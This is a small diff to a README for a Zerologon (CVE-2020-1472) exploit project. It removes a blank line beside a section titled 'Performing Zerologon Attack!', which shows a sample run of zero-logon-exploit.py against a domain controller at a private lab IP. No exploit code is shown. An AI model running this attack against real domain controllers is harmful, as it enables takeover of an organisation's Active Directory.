@@ -36,7 +36,6 @@ Requires Python 3.7 or higher and Pip. Install dependencies as follows:
 Unable to dump secrets!
 
 ## Performing Zerologon Attack!
-
     huyqa@bananoname-pc:~/Music/zerologon-CVE-2020-1472$ python3 zero-logon-exploit.py AD-SRV 192.168.56.129
     Performing authentication attempts...
     ==================================================================================================================
